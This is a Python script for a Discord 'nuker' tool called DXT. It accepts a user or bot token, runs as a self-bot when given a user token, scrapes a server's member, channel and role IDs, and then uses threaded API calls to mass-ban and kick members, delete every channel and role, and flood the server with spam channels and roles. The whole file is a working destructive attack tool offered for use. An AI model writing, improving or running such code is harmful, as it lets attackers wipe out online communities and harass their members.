import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp
from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands

os.system(f'cls')

token = input(f'[>] Token :')

os.system('cls')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

client.remove_command("help")

class DXT:

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"[>] Banned {member.strip()}")
                    break
                else:
                    break

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"[>] Kicked {member.strip()}")
                    break
                else:
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"[>] Deleted Channel {channel.strip()}")
                    break
                else:
                    break
          
    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"[>] Deleted Role {role.strip()}")
                    break
                else:
                    break

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"[>] Created Channel {name}")
                    break
                else:
                    break

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"[>] Created Role {name}")
                    break
                else:
                    break

    async def Scrape(self):
        guild = input(f'[>] Guild ID : ')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("Scraped/members.txt")
            os.remove("Scraped/channels.txt")
            os.remove("Scraped/roles.txt")
        except:
            pass

        membercount = 0
        with open('Scraped/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"[>] Scraped {membercount} Members")
            m.close()

        channelcount = 0
        with open('Scraped/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"[>] Scraped {channelcount} Channels")
            c.close()

        rolecount = 0
        with open('Scraped/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"[>] Scraped {rolecount} Roles")
            r.close()

    async def NukeExecute(self):
        guild = input(f'[>] Guild ID : ')
        channel_name = input(f"[>] Channel Names : ")
        channel_amount = input(f"[>] Channel Amount : ")
        role_name = input(f"[>] Role Names : ")
        role_amount = input(f"[>] Role Amount : ")
        print()

        members = open('Scraped/members.txt')
        channels = open('Scraped/channels.txt')
        roles = open('Scraped/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

    async def BanExecute(self):
        guild = input(f'[>] Guild ID : ')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()

    async def KickExecute(self):
        guild = input(f'[>] Guild ID: ')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

    async def ChannelDeleteExecute(self):
        guild = input(f'[>] Guild ID : ')
        print()
        channels = open('Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

    async def RoleDeleteExecute(self):
        guild = input(f'[>] Guild ID : ')
        print()
        roles = open('Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

    async def ChannelSpamExecute(self):
        guild = input(f'[>] Guild ID : ')
        name = input(f"[>] Channel Names : ")
        amount = input(f"[>] Amount : ")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'[>] Guild ID : ')
        name = input(f"[>] Role Names : ")
        amount = input(f"[>] Amount : ")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'[>] Guild ID: ')
        name = input(f"[>] Role Names: ")
        amount = input(f"[>] Amount: ")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()
    async def ThemeChanger(self):
        os.system(f'cls')
        print(f'''
                      
█
██████╗░██╗░░██╗████████╗
██╔══██╗╚██╗██╔╝╚══██╔══╝
██║░░██║░╚███╔╝░░░░██║░░░
██║░░██║░██╔██╗░░░░██║░░░
██████╔╝██╔╝╚██╗░░░██║░░░
╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░
MADE BY SHRISANT !!
                   
                      
                  >1 Ban Members             >4 Nuke full server
                  >2 Kick Members            >5 Spam channel
                  >3 Delete Channels         >6 Spam Roles 
                  >4 Delete Roles            >7 Scrape
                 
        ''')
        choice = input(f'[>] Choice :')

        if choice == '1':
            await self.ThemeChanger()
        elif choice == '2':
            await self.ThemeChanger()
        elif choice == '3':
            await self.ThemeChanger()
        elif choice == '4':
            await self.ThemeChanger()
        elif choice == '5':
            await self.ThemeChanger()
        elif choice == '6':
            await self.ThemeChanger()
        elif choice == '7':
            await self.ThemeChanger()
        elif choice == '8':
            await self.ThemeChanger()
        elif choice == '9':
            await self.ThemeChanger()
        elif choice == '0':
            await self.ThemeChanger()
        elif choice == 'M' or choice == 'm':
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    async def Menu(self):
        os.system(f'cls')
        print(f'''
                   
██████╗░██╗░░██╗████████╗
██╔══██╗╚██╗██╔╝╚══██╔══╝
██║░░██║░╚███╔╝░░░░██║░░░
██║░░██║░██╔██╗░░░░██║░░░
██████╔╝██╔╝╚██╗░░░██║░░░
╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░
SHRISANT ™
DXT ™ = https://discord.gg/PUffaYEsKM 
              USE COMMANDS
                      
                  >1 Ban Members             >5 Nuke full server
                  >2 Kick Members            >6 Spam channel
                  >3 Delete Channels         >7 Spam Roles 
                  >4 Delete Roles            >8 Scrape
        ''')

        choice = input(f'[>] Choice : ')
        if choice == '1':
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '2':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5':
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
            input()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    @client.event
    async def on_ready():
        await DXT().Menu()
            
    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'[>] Invalid Token')
            input()
            os._exit(0)

if __name__ == "__main__":
    DXT().Startup()